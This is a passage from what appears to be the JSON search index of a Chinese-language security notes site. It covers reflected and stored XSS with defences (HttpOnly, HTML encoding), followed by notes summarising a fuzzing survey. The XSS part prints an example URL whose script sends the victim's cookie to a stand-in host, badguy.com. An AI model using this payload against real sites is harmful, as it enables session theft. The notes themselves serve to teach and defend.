\u4e2d\u7684\u4e00\u4e2a\u9875\u9762\u6709 XSS \u6f0f\u6d1e\uff0c</p> <p>\u4f8b\u5982: http://victim.com/search.asp?term=apple</p> <pre><code>&lt;html&gt;\n  \u3000\u3000&lt;title\n  &gt;&lt;/title&gt;\n  \u3000\u3000\n  &lt;body&gt;\n    \u3000\u3000\u3000\u3000Results for &lt;%Reequest.QueryString(\"term\")%&gt; \u3000\u3000\u3000\u3000... \u3000\u3000\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Tom \u5148\u5efa\u7acb\u4e00\u4e2a\u7f51\u7ad9http://badguy.com, \u7528\u6765\u63a5\u6536\u201c\u5077\u201d\u6765\u7684\u4fe1\u606f\u3002 \u7136\u540e Tom \u6784\u9020\u4e00\u4e2a\u6076\u610f\u7684 url(\u5982\u4e0b), \u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f(\u90ae\u4ef6\uff0cQQ)\u53d1\u7ed9 Monica</p> <pre><code>http://victim.com/search.asp?term=&lt;script&gt;window.open(\"http://badguy.com?cookie=\"+document.cookie)&lt;/script&gt;\n</code></pre> <p>Monica \u70b9\u51fb\u4e86\u8fd9\u4e2a URL\uff0c \u5d4c\u5165\u5728 URL \u4e2d\u7684\u6076\u610f Javascript \u4ee3\u7801\u5c31\u4f1a\u5728 Monica \u7684\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002 \u90a3\u4e48 Monica \u5728 victim.com \u7f51\u7ad9\u7684 cookie, \u5c31\u4f1a\u88ab\u53d1\u9001\u5230 badguy \u7f51\u7ad9\u4e2d\u3002\u8fd9\u6837 Monica \u5728 victim.com \u7684\u4fe1\u606f\u5c31\u88ab Tom \u76d7\u4e86\u3002</p> <p>\u6301\u4e45\u578b XSS</p> <p>\u53c8\u79f0\u5b58\u50a8\u578b\uff0c\u8be5\u7c7b\u578b\u662f\u5e94\u7528\u5e7f\u6cdb\u800c\u4e14\u6709\u53ef\u80fd\u5f71\u54cd\u5927 Web \u670d\u52a1\u5668\u81ea\u8eab\u5b89\u5168\u7684\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5c06\u653b\u51fb\u811a\u672c\u4e0a\u4f20\u5230 Web \u670d\u52a1\u5668\u4e0a\uff0c\u4f7f\u5f97\u6240\u6709\u8bbf\u95ee\u8be5\u9875\u9762\u7684\u7528\u6237\u90fd\u9762\u4e34\u4fe1\u606f\u6cc4\u9732\u7684\u53ef\u80fd\u3002 \u653b\u51fb\u8fc7\u7a0b\u5982\u4e0b</p> <p>Alex \u53d1\u73b0\u4e86\u7f51\u7ad9 A \u4e0a\u6709\u4e00\u4e2a XSS \u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u5141\u8bb8\u5c06\u653b\u51fb\u4ee3\u7801\u4fdd\u5b58\u5728\u6570\u636e\u5e93\u4e2d\uff0c</p> <p>Alex \u53d1\u5e03\u4e86\u4e00\u7bc7\u6587\u7ae0\uff0c\u6587\u7ae0\u4e2d\u5d4c\u5165\u4e86\u6076\u610f JavaScript \u4ee3\u7801\u3002</p> <p>\u5176\u4ed6\u4eba\u5982 Monica \u8bbf\u95ee\u8fd9\u7247\u6587\u7ae0\u7684\u65f6\u5019\uff0c\u5d4c\u5165\u5728\u6587\u7ae0\u4e2d\u7684\u6076\u610f Javascript \u4ee3\u7801\u5c31\u4f1a\u5728 Monica \u7684\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\uff0c\u5176\u4f1a\u8bdd cookie \u6216\u8005\u5176\u4ed6\u4fe1\u606f\u5c06\u88ab Alex \u76d7\u8d70\u3002</p> <p>Dom-Based XSS \u6f0f\u6d1e\u5a01\u80c1\u7528\u6237\u4e2a\u4f53\uff0c\u800c\u5b58\u50a8\u5f0f XSS \u6f0f\u6d1e\u6240\u5a01\u80c1\u7684\u5bf9\u8c61\u5c06\u662f\u5927\u91cf\u7684\u7528\u6237\u3002</p> <p>XSS \u7684\u9632\u5fa1\uff1a \u5bf9\u8f93\u5165\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5bf9\u8f93\u51fa\u8fdb\u884c\u7f16\u7801</p> <ul> <li>httpOnly\uff1a\u5728 cookie \u4e2d\u8bbe\u7f6e HttpOnly \u5c5e\u6027\u540e\uff0cjs \u811a\u672c\u5c06\u65e0\u6cd5\u8bfb\u53d6\u5230 cookie \u4fe1\u606f\uff08\u4f8b\u5982 document.cookie\uff09\u3002</li> </ul> <p></p> <ul> <li>\u5bf9\u6570\u636e\u8fdb\u884c Html Encode \u5904\u7406\uff0c\u5373\u8f6c\u4e49 HTML\uff0c\u5bf9 url \u4e2d\u7684\u5f15\u53f7\uff0c\u5c16\u62ec\u53f7\uff0c\u659c\u6760\u8fdb\u884c\u8f6c\u4e49\u3002\u4f8b\u5982\uff1ahtmlspecialchars() \u51fd\u6570\u628a\u4e00\u4e9b\u9884\u5b9a\u4e49\u7684\u5b57\u7b26\u8f6c\u6362\u4e3a HTML \u5b9e\u4f53\u3002</li> </ul> <p>HTML Encode \u548c URL Encode</p> <ul> <li>HTML Encode\uff1aXSS \u4e4b\u6240\u4ee5\u4f1a\u53d1\u751f\uff0c \u662f\u56e0\u4e3a\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u53d8\u6210\u4e86\u4ee3\u7801\u3002 \u6240\u4ee5\u6211\u4eec\u9700\u8981\u5bf9\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u8fdb\u884c HTML Encode \u5904\u7406\u3002 \u5c06\u5176\u4e2d\u7684\"\u4e2d\u62ec\u53f7\"\uff0c \u201c\u5355\u5f15\u53f7\u201d\uff0c\u201c\u5f15\u53f7\u201d \u4e4b\u7c7b\u7684\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\u3002</li> </ul> <pre><code>#\u9884\u5b9a\u4e49\u7684\u5b57\u7b26\u662f\uff1a\n&amp; (\u548c\u53f7)   \u6210\u4e3a &amp;amp\n\" (\u53cc\u5f15\u53f7) \u6210\u4e3a &amp;quot\n\u2019 (\u5355\u5f15\u53f7) \u6210\u4e3a &amp;#039\n&lt; (\u5c0f\u4e8e)   \u6210\u4e3a &amp;lt\n&gt; (\u5927\u4e8e)   \u6210\u4e3a &amp;gt\n</code></pre> <ul> <li>URL Encode\uff1aURL \u7f16\u7801\u662f\u4e3a\u4e86\u7b26\u5408 url \u7684\u89c4\u8303\u3002\u56e0\u4e3a\u5728\u6807\u51c6\u7684 url \u89c4\u8303\u4e2d\u4e2d\u6587\u548c\u5f88\u591a\u7684\u5b57\u7b26\u662f\u4e0d\u5141\u8bb8\u51fa\u73b0\u5728 url \u4e2d\u7684\u3002</li> </ul> <p>\u4f8b\u5982\u5728 baidu \u4e2d\u641c\u7d22\"\u6d4b\u8bd5\u6c49\u5b57\"\u3002 URL \u4f1a\u53d8\u6210   http://www.baidu.com/s?wd=%B2%E2%CA%D4%BA%BA%D7%D6&amp;rsv_bp=0&amp;rsv_spt=3&amp;inputT=7477</p> <ul> <li> <p>\u9ed1\u540d\u5355</p> </li> <li> <p>\u8fc7\u6ee4 \u6216\u79fb\u9664\u7279\u6b8a\u7684 Html \u6807\u7b7e\uff0c \u4f8b\u5982: \\"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/","title":"Fuzzing","text":"<p>The Art, Science, and Engineering of Fuzzing: A Survey</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#_1","title":"\u672f\u8bed","text":"<p>\u672f\u8bed <code>fuzz</code> \u6700\u521d\u7531 1990 \u5e74 Miller \u7b49\u4eba\u521b\u9020\uff0c\u6307\u7684\u662f\u751f\u6210\u7531\u76ee\u6807\u7a0b\u5e8f\u4f7f\u7528\u7684\u968f\u673a\u5b57\u7b26\u6d41\u7684\u7a0b\u5e8f\uff0c\u6b64\u540e\u8be5\u672f\u8bed\u5728\u5404\u79cd\u5404\u6837\u7684\u4e0a\u4e0b\u6587\u4e2d\u88ab\u4f7f\u7528\uff0c\u5305\u62ec\u52a8\u6001\u7b26\u53f7\u6267\u884c\u3001\u6e17\u900f\u6d4b\u8bd5\u3001\u9c81\u68d2\u6027\u6d4b\u8bd5\u7b49\uff0c\u4e3a\u4e86\u7cfb\u7edf\u5316\u6574\u5408\u5927\u91cf\u6a21\u7cca\u6d4b\u8bd5\u6587\u732e\u4e2d\u7684\u77e5\u8bc6\uff0c\u7ed9\u51fa\u73b0\u4ee3\u7528\u6cd5\u4e2d\u63d0\u53d6\u7684\u6a21\u7cca\u6d4b\u8bd5\u672f\u8bed\uff1a</p> <ul> <li> <p>PUT\uff1aProgram Under Test\uff08\u5f85\u6d4b\u7a0b\u5e8f\uff09</p> </li> <li> <p>Fuzzing\uff1a\u4f7f\u7528\u8f93\u5165\u7a7a\u95f4\u4e2d\u7684 inputs \u6765\u6267\u884c PUT</p> </li> <li> <p>Fuzz Testing\uff1a\u4f7f\u7528 Fuzzing \u6765\u6d4b\u8bd5 PUT \u662f\u5426\u8fdd\u53cd\u5b89\u5168\u7b56\u7565</p> </li> <li> <p>Fuzzer\uff1aA fuzzer is a program that performs fuzz testing on a PUT.</p> </li> <li> <p>Fuzz Campaign\uff1afuzzer \u5728\u7279\u5b9a\u5b89\u5168\u7b56\u7565\u4e0b\u5bf9 PUT \u7684\u4e00\u8f6e fuzz\uff0c\u76ee\u7684\u662f\u53d1\u73b0\u8fdd\u53cd\u5b89\u5168\u7b56\u7565\u7684 bug\u3002</p> </li> </ul> <p>\u65e9\u671f\u6a21\u7cca\u6d4b\u8bd5\u5668\u7684\u5b89\u5168\u7b56\u7565\uff1a\u4ec5\u4ec5\u53ea\u662f\u6d4b\u8bd5\u751f\u6210\u7684\u6d4b\u8bd5\u7528\u4f8b\u662f\u5426\u4f7f\u5f97\u5f85\u6d4b\u7a0b\u5e8f\uff08PUT\uff09\u5d29\u6e83\uff08Crash\uff09\u3002</p> <p>\u4f46\u73b0\u4ee3\u5316\u7684\u6a21\u7cca\u6d4b\u8bd5\u53ef\u4ee5\u7528\u6765\u6d4b\u8bd5\u4efb\u4f55\u5b89\u5168\u7b56\u7565\u3002\u51b3\u5b9a\u6d4b\u8bd5\u7528\u4f8b\u7684\u6267\u884c\u662f\u5426\u8fdd\u53cd\u5b89\u5168\u7b56\u7565\u7684\u7279\u5b9a\u673a\u5236\u79f0\u4e3a Bug Oracle</p> <ul> <li> <p>Bug Oracle\uff1aa program, \u53ef\u80fd\u662f fuzzer \u7684\u4e00\u90e8\u5206\uff0c\u51b3\u5b9a\u7ed9\u5b9a\u7684 PUT \u7684\u6267\u884c\u662f\u5426\u8fdd\u53cd\u4e86\u7279\u5b9a\u7684\u5b89\u5168\u7b56\u7565</p> </li> <li> <p>Fuzz Configuration\uff1a\u63a7\u5236 Fuzz alogrithm \u7684\u53c2\u6570\u503c\uff0c\u8be5\u914d\u7f6e\u7684\u7c7b\u578b\u6709 fuzz alogrithm \u7684\u6027\u8d28\u51b3\u5b9a\u3002</p> </li> </ul> <p>\u5c06 fuzzer \u5b9e\u73b0\u7684\u7b97\u6cd5\u79f0\u4e3a fuzz alogrithm\u3002 \u9664\u4e86 PUT \u6240\u9700\u7684\u53c2\u6570\u5916\uff0c\u51e0\u4e4e\u6240\u6709 fuzz alogrithms \u90fd\u8fd8\u4f9d\u8d56\u4e8e\u5176\u4ed6\u7684\u53c2\u6570\uff0c\u79f0\u4e3a fuzz configuration\u3002</p> <p>seed \u662f Fuzz Configuration \u7684\u4e00\u90e8\u5206\u3002</p> <ul> <li>seed\uff1a\u4e00\u822c\u662f\u5bf9 PUT \u7cbe\u5fc3\u6784\u9020\u7684\u8f93\u5165\uff0c\u88ab\u7528\u4e8e\u53d8\u5f02\u751f\u6210\u591a\u79cd\u6d4b\u8bd5\u7528\u4f8b\u3002fuzzer \u901a\u5e38\u4f1a\u7ef4\u62a4\u79cd\u5b50\u96c6\u5408\uff0c\u6210\u4e3a seed pools\u3002\u6709\u4e9b\u8fd8\u4f1a\u5728\u6bcf\u8f6e fuzz \u7ed3\u675f\u540e\u8fdb\u5316\u79cd\u5b50\u6c60\u3002</li> </ul> <p>fuzzer \u80fd\u591f\u5728\u914d\u7f6e\u4e2d\u5b58\u50a8\u6570\u636e\uff0c\u4f8b\u5982 coverage-guided fuzzers \u5c06\u83b7\u53d6\u7684 coverage \u5b58\u50a8\u5728\u914d\u7f6e\u4e2d\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#_2","title":"\u7b97\u6cd5","text":"<p>Fuzzing \u7684\u666e\u9002\u7b97\u6cd5\uff1a</p> <p></p> <p>\u8f93\u5165 a set of fuzz configurations \u548c\u8d85\u65f6\u65f6\u95f4\uff0c\u8f93\u51fa\u53d1\u73b0\u7684 Bug\u3002</p> <p>\u8be5\u7b97\u6cd5\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff1a</p> <ul> <li>PREPROCESS\uff0c\u9884\u5904\u7406\uff0c\u5728 fuzz campaign \u5f00\u59cb\u524d\u6267\u884c\u3002\u8be5\u51fd\u6570\u8f93\u5165 fuzz configurations\uff0c\u8f93\u51fa potentially-modified fuzz configurantions\u3002 \u53d6\u51b3\u4e8e fuzz algorithm\uff0c PREPROCESS \u51fd\u6570\u7684\u4f5c\u7528\u4e0d\u540c\uff0c\u53ef\u80fd\u662f\u5bf9 PUT \u7684\u4ee3\u7801\u8fdb\u884c\u63d2\u6869\uff0c\u4e5f\u53ef\u80fd\u8ba1\u7b97 seed \u6587\u4ef6\u7684\u6267\u884c\u901f\u5ea6\u7b49\u3002</li> <li>\u5faa\u73af\uff0c\u4e00\u6b21\u5faa\u73af\u79f0\u4e3a\u6a21\u7cca\u8fed\u4ee3\uff08fuzz iteration\uff09\uff0c\u5176\u4e2d INPUTEVAL \u51fd\u6570\u4f7f\u7528\u6d4b\u8bd5\u7528\u4f8b\u8fd0\u884c PUT \u79f0\u4e3a fuzz run\u3002\u5faa\u73af\u5185\u4e94\u4e2a\u51fd\u6570\uff1a</li> <li>SCHEDULE\uff1a\u4ece\u8f93\u5165\u7684\u914d\u7f6e\u96c6\u5408\u4e2d\u9009\u62e9\u4e00\u4e2a\u6a21\u7cca\u914d\u7f6e\uff0c\u7528\u4e8e\u672c\u6b21\u6a21\u7cca\u8fed\u4ee3\u3002</li> <li>INPUTGEN\uff1a\u5c06\u6a21\u7cca\u914d\u7f6e\u4f5c\u4e3a\u8f93\u5165\uff0c\u751f\u6210\u4e00\u7ec4\u5177\u4f53\u7684\u6d4b\u8bd5\u7528\u4f8b tcs\uff08test cases\uff09\u3002\u5728\u751f\u6210 tcs \u65f6\uff0cINPUTGEN \u4f7f\u7528\u6a21\u7cca\u914d\u7f6e\u4e2d\u7684\u7279\u5b9a\u53c2\u6570\u3002 Some fuzzers use a seed in conf for generating test cases, while others use a model or grammar as a parameter.</li> <li>INPUTEVAL\uff1a\u4f7f\u7528\u6d4b\u8bd5\u7528\u4f8b tcs \u6267\u884c PUT\uff0c\u4f7f\u7528 bug oracle \u5224\u65ad\u662f\u5426\u8fdd\u53cd\u5b89\u5168\u7b56\u7565\uff0c\u8f93\u51fa\u8fdd\u53cd\u7b56\u7565\u7684 bugs \u4ee5\u53ca fuzz run \u7684\u6267\u884c\u4fe1\u606f\uff08\u53ef\u7528\u4e8e\u66f4\u65b0 fuzz configurantions\uff09</li> <li>CONFUPDATE\uff1a\u66f4\u65b0\u6a21\u7cca\u914d\u7f6e\uff0c\u8bb8\u591a\u7070\u76d2 fuzzer \u4f1a\u57fa\u4e8e\u6267\u884c\u4fe1\u606f\u51cf\u5c11\u6a21\u7cca\u914d\u7f6e\u7684\u6570\u91cf\u3002</li> <li>CONTINUE\uff1a\u5c06\u6a21\u7cca\u914d\u7f6e\u4f5c\u4e3a\u8f93\u5165\uff0c\u8f93\u51fa\u5e03\u5c14\u503c\uff0c\u6307\u793a\u662f\u5426\u7ee7\u7eed\u6a21\u7cca\u8fed\u4ee3\u3002\u6b64\u51fd\u6570\u53ef\u7528\u4e8e\u5bf9\u767d\u76d2\u6a21\u7cca\u5668\u8fdb\u884c\u5efa\u6a21\uff0c\u5f53\u6ca1\u6709\u66f4\u591a\u8def\u5f84\u53ef\u4f9b\u53d1\u73b0\u65f6\uff0c\u8fd9\u4e9b\u6a21\u7cca\u5668\u53ef\u4ee5\u7ec8\u6b62\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#_3","title":"\u5206\u7c7b","text":"<p>\u9ed1\u76d2\u3001\u767d\u76d2\u3001\u7070\u76d2\u4e09\u79cd\uff0c\u4f20\u7edf\u7684\u8f6f\u4ef6\u6d4b\u8bd5\u53ea\u6709\u9ed1\u76d2\u548c\u767d\u76d2\u6d4b\u8bd5\uff0c\u7070\u76d2\u662f\u767d\u76d2\u7684\u8fa9\u9898\uff0c\u53ea\u80fd\u4ece\u6bcf\u6b21 fuzz run \u4e2d\u83b7\u53d6\u4e00\u90e8\u5206\u4fe1\u606f\u3002</p> <ul> <li>\u9ed1\u76d2\uff1a\u770b\u4e0d\u5230 PUT \u5185\u90e8\u4fe1\u606f\uff0c\u53ea\u80fd\u89c2\u5bdf PUT \u7684\u8f93\u5165/\u8f93\u51fa\u3002\u5728\u8f6f\u4ef6\u6d4b\u8bd5\u4e2d\uff0c\u9ed1\u76d2\u6d4b\u8bd5\u4e5f\u79f0\u4e3a IO \u9a71\u52a8\u6216\u6570\u636e\u9a71\u52a8\u6d4b\u8bd5\u3002\u5927\u591a\u6570\u4f20\u7edf fuzzer \u90fd\u5c5e\u4e8e\u9ed1\u76d2\uff0c\u73b0\u4ee3 fuzzer \u5f80\u5f80\u4f1a\u8003\u8651\u8f93\u5165\u7684\u7ed3\u6784\u4fe1\u606f\uff0c\u4ee5\u751f\u6210\u66f4\u6709\u610f\u4e49\u7684\u6d4b\u8bd5\u7528\u4f8b\u3002</li> <li>\u767d\u76d2\uff1a\u80fd\u591f\u7cfb\u7edf\u7684\u63a2\u7d22 PUT \u7684\u72b6\u6001\u7a7a\u95f4\uff0c\u767d\u76d2\u6a21\u7cca\u672f\u8bed\u7531 Godefroid \u4e8e 2007 \u5e74\u5f15\u5165\uff0c\u6307\u7684\u662f\u52a8\u6001\u7b26\u53f7\u6267\u884c\u3002 \u6b64\u5916\uff0c\u767d\u76d2\u6a21\u7cca\u8fd8\u88ab\u7528\u4e8e\u63cf\u8ff0\u91c7\u7528\u6c61\u70b9\u5206\u6790\u7684 fuzzer\u3002\u767d\u76d2\u6d4b\u8bd5\u5f00\u9500\u6bd4\u9ed1\u76d2\u9ad8\u5f97\u591a\u3002</li> <li>\u7070\u76d2\uff1a\u7070\u76d2 fuzzer \u53ef\u4ee5\u83b7\u53d6 PUT \u7684\u5185\u90e8\u4fe1\u606f\u53ca\uff08\u6216\uff09\u6267\u884c\u4fe1\u606f\u3002\u4f46\u4e0d\u540c\u4e8e\u767d\u76d2\u6d4b\u8bd5\uff0c\u7070\u76d2 fuzzer \u4e0d\u63a8\u7406 PUT \u7684\u5168\u90e8\u8bed\u4e49\uff0c\u800c\u662f\u6267\u884c\u8f7b\u91cf\u7ea7\u9759\u6001\u5206\u6790\u3001\u6536\u96c6\u6709\u5173\u5176\u6267\u884c\u7684\u52a8\u6001\u4fe1\u606f\uff0c\u4f8b\u5982\u4ee3\u7801\u8986\u76d6\u7387\u3002</li> </ul> <p>\u9ed1\u767d\u7070\u6a21\u7cca\u4e4b\u95f4\u7684\u533a\u522b\u5e76\u4e0d\u6e05\u6670\uff0c\u9ed1\u76d2 fuzzer \u4e5f\u53ef\u80fd\u4f1a\u6536\u96c6\u6267\u884c\u4fe1\u606f\u7b49\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#preprocess","title":"PREPROCESS \u9884\u5904\u7406","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#instrumentation","title":"Instrumentation\uff08\u63d2\u6869\uff09","text":"<p>\u4e0d\u540c\u4e8e\u9ed1\u76d2\u6d4b\u8bd5\uff0c\u767d\u76d2\u548c\u7070\u76d2\u6d4b\u8bd5\u90fd\u53ef\u4ee5\u5bf9 PUT \u8fdb\u884c\u63d2\u6869\uff0c\u6765\u83b7\u53d6 INPUTEVAL \u7684\u6267\u884c\u53cd\u9988\u4fe1\u606f\uff0c\u6536\u96c6\u7684\u4fe1\u606f\u4fe9\u4e2a\u51b3\u5b9a\u4e86 fuzzer \u7684\u7c7b\u578b\uff08\u9ed1\u767d\u7070\uff09\u3002\u5c3d\u7ba1\u8fd8\u6709\u5176\u4ed6\u529e\u6cd5\u83b7\u53d6 PUT \u5185\u90e8\u4fe1\u606f\uff08\u4f8b\u5982 processor traces or system call usage\uff09\uff0c\u4f46\u63d2\u6869\u662f\u6700\u5e38\u7528\u4e14\u6700\u6709\u6548\u7684\u65b9\u6cd5\u3002</p> <p>\u63d2\u6869\u5206\u4e3a\uff1a</p> <ul> <li>\u9759\u6001\u63d2\u6869\uff1a\u5728 PREPROCESS \u9636\u6bb5\u8fdb\u884c\u3002\u901a\u5e38\u5728\u6e90\u4ee3\u7801\u6216\u4e2d\u95f4\u4ee3\u7801\u7684\u7f16\u8bd1\u65f6\u6267\u884c\uff0c\u76f8\u6bd4\u4e8e\u52a8\u6001\u63d2\u6869\uff0c\u5176\u5f00\u9500\u5c0f\u3002\u82e5 PUT \u4f9d\u8d56\u5e93\uff0c\u5219\u5fc5\u987b\u5355\u72ec\u68c0\u6d4b\u5e93\u3002</li> <li>\u52a8\u6001\u63d2\u6869\uff1a\u5728 PUT \u8fd0\u884c\u65f6\u8fdb\u884c\uff0c\u5373 INPUTEVAL \u9636\u6bb5\u3002\u5bf9 PUT \u4f9d\u8d56\u5e93\u63d2\u6869\u66f4\u7b80\u5355\uff0c\u4f46\u9ad8\u5f00\u9500\u3002</li> </ul> <p>\u901a\u5e38\uff0cfuzzer \u53ef\u4ee5\u652f\u6301\u591a\u79cd\u7c7b\u578b\u7684\u63d2\u6869\uff0c\u4f8b\u5982 AFL \u652f\u6301\u6e90\u4ee3\u7801\u7ea7\u522b\u7684\u9759\u6001\u63d2\u6869\uff0c\u6216\u5728 QEMU \u7684\u5e2e\u52a9\u4e0b\u652f\u6301\u4e8c\u8fdb\u5236\u7ea7\u522b\u7684\u52a8\u6001\u63d2\u6869\u3002</p> <p>Execution Feedback</p> <p>\u7070\u76d2 fuzzer \u901a\u5e38\u628a\u6267\u884c\u53cd\u9988\u4f5c\u4e3a\u6f14\u5316\u6d4b\u8bd5\u7528\u4f8b\u7684\u8f93\u5165\u3002</p> <p>In-Memory Fuzzing</p> <p>\u5982\u679c\u6d4b\u8bd5\u7684\u7a0b\u5e8f\u5f88\u5927\uff0c\u4f46\u6709\u65f6\u53ea\u662f\u9700\u8981\u6d4b\u8bd5\u5176\u4e2d\u7684\u4e00\u90e8\u5206\u529f\u80fd\u65f6\uff0c\u53ef\u4ee5\u5148\u5b58\u50a8\u4e00\u4efd\u5185\u5b58\u5feb\u7167\uff0c\u5728\u65b0\u7684\u6d4b\u8bd5\u7528\u4f8b\u76f4\u63a5\u5199\u5165\u5185\u5b58\u4e4b\u524d\uff0c\u6062\u590d\u5185\u5b58\u5feb\u7167\uff0c\u8fd9\u6837\u80fd\u6700\u5c0f\u5316\u91cd\u65b0\u542f\u52a8\u7a0b\u5e8f\u6240\u9700\u5f00\u9500\u3002</p> <p>\u5185\u5b58 API Fuzzing\uff1a\u4e0d\u9700\u8981\u91cd\u65b0\u6062\u590d PUT \u7684\u72b6\u6001\uff0c\u53ef\u4ee5\u91cd\u590d\u6267\u884c\u6d4b\u8bd5\u3002\u7f3a\u70b9</p> <ul> <li>\u53d1\u73b0 bugs \u65e0\u6cd5\u590d\u73b0\uff0c\u56e0\u4e3a\u6ca1\u529e\u6cd5\u6784\u9020\u76ee\u6807\u51fd\u6570\u7684\u8c03\u7528\u4e0a\u4e0b\u6587\u3002</li> <li>\u4e0d\u80fd\u6355\u83b7\u591a\u4e2a\u51fd\u6570</li> <li>\u53ef\u9760\u6027\u53d6\u51b3\u4e8e\u5165\u53e3\u51fd\u6570\uff0c\u4f46\u5165\u53e3\u51fd\u6570\u7684\u5bfb\u627e\u975e\u5e38\u56f0\u96be\u3002</li> </ul> <p>Thread Scheduling</p> <p>Race Condition bugs \u5f88\u96be\u89e6\u53d1\uff0c\u56e0\u4e3a\u5176\u4f9d\u8d56\u4e8e\u53ef\u80fd\u5f88\u5c11\u53d1\u751f\u7684\u975e\u786e\u5b9a\u6027\u884c\u4e3a\uff0c\u4f46\u662f\u63d2\u6869\u4e5f\u53ef\u4ee5\u901a\u8fc7\u663e\u5f0f\u63a7\u5236\u7ebf\u7a0b\u7684\u8c03\u5ea6\u65b9\u5f0f\u6765\u89e6\u53d1\u4e0d\u540c\u7684\u975e\u786e\u5b9a\u6027\u7a0b\u5e8f\u884c\u4e3a\u3002</p> <p>\u73b0\u6709\u5de5\u4f5c\u8868\u660e\uff0c\u5373\u4f7f\u662f\u968f\u673a\u8c03\u5ea6\u7ebf\u7a0b\u4e5f\u53ef\u4ee5\u6709\u6548\u5730\u53d1\u73b0 Race Condition bugs</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#seed-selection","title":"Seed Selection","text":"<p>fuzzer \u63a5\u53d7\u4e00\u7ec4\u63a7\u5236\u6a21\u7cca\u7b97\u6cd5\u884c\u4e3a\u7684\u6a21\u7cca\u914d\u7f6e\uff0c\u7136\u800c\uff0c\u6a21\u7cca\u914d\u7f6e\u4e2d\u7684\u4e00\u4e9b\u53c2\u6570\uff0c\u4f8b\u5982\u57fa\u4e8e\u53d8\u5f02\u7684 fuzzer \u7684 seed\uff0c\u5177\u6709\u5f88\u5927\u7684\u503c\u57df\u3002</p> <p>\u4f8b\u5982\uff1a\u5047\u8bbe\u5bf9\u4e00\u4e2a\u63a5\u6536 MP3 \u6587\u4ef6\u4f5c\u4e3a\u8f93\u5165\u7684 MP3 \u64ad\u653e\u5668\u8fdb\u884c\u6a21\u7cca\u5904\u7406\u3002</p> <p>\u7531\u4e8e\u6709\u6548\u7684 MP3 \u6587\u4ef6\u6570\u91cf\u65e0\u9650\uff0c\u90a3\u4e48\u5e94\u8be5\u4f7f\u7528\u54ea\u4e9b\u79cd\u5b50\u8fdb\u884c\u6a21\u7cca\u5904\u7406\uff1f</p> <p>\u51cf\u5c0f\u521d\u59cb\u79cd\u5b50\u6c60\u5927\u5c0f\u7684\u95ee\u9898\u79f0\u4e3a\u79cd\u5b50\u9009\u62e9\u95ee\u9898\u3002</p> <p>\u6709\u51e0\u79cd\u65b9\u6cd5\u548c\u5de5\u5177\u53ef\u4ee5\u89e3\u51b3\u8be5\u95ee\u9898\uff0c\u5e38\u89c1\u7684\u65b9\u6cd5\u662f\uff1a\u627e\u5230\u4e00\u4e2a\u6700\u5c0f\u7684 seed \u96c6\uff0c\u6700\u5927\u5316\u8986\u76d6\u5ea6\u91cf\uff08\u4f8b\u5982\u8282\u70b9\u8986\u76d6\uff09\u3002\u8be5\u8fc7\u7a0b\u79f0\u4e3a\u8ba1\u7b97\u6700\u5c0f\u96c6\u3002</p> <ul> <li>\u4f7f\u7528\u5206\u652f\u5bf9\u6570\u8ba1\u6570\u5668\uff0c\u8ba1\u7b97\u5206\u652f\u8986\u76d6\u7387\u3002</li> <li>\u57fa\u4e8e\u6307\u4ee4\u3001\u5206\u652f\u548c\u552f\u4e00\u57fa\u672c\u5757\uff08basic blocks\uff09\u6570\u91cf\u8ba1\u7b97\u8986\u76d6\u7387\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#seed-trimming","title":"Seed Trimming","text":"<p>\u66f4\u5c11\u7684\u79cd\u5b50\u80fd\u51cf\u5c11\u5185\u5b58\u7684\u6d88\u8017\u548c\u83b7\u5f97\u66f4\u5927\u7684\u541e\u5410\u91cf\u3002\uff08\u53ef\u4ee5\u53d1\u751f\u5728\u5f53\u524d\u7684 PREPROCESS\uff0c\u4e5f\u53ef\u4ee5\u53d1\u751f\u5728 CONFUPDATE\uff09</p> <ul> <li>\u4fdd\u8bc1\u8986\u76d6\u7387\u4e0d\u53d8\u7684\u524d\u63d0\u4e0b\uff0c\u4e0d\u65ad\u53bb\u8fed\u4ee3\u4fee\u526a\u79cd\u5b50\u3002</li> <li>\u8d4b\u4e88\u6570\u91cf\u5c0f\u7684\u79cd\u5b50\u66f4\u9ad8\u7684\u4f18\u5148\u7ea7\uff0c\u4f46\u4f1a\u9020\u6210\u53d1\u73b0\u7279\u6b8a bug \u6570\u91cf\u6bd4\u968f\u673a\u79cd\u5b50\u5c11\u3002</li> <li>\u4fdd\u7559\u4f7f\u7528\u9759\u6001\u5206\u6790\u68c0\u6d4b\u8c03\u7528\u4e4b\u95f4\u5173\u7cfb\uff0c\u6269\u5c55 Fuzzer \u51cf\u5c11\u79cd\u5b50\u6570\u91cf\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#preparing-a-driver-application","title":"Preparing a Driver Application","text":"<p>\u76f4\u63a5\u6d4b\u8bd5 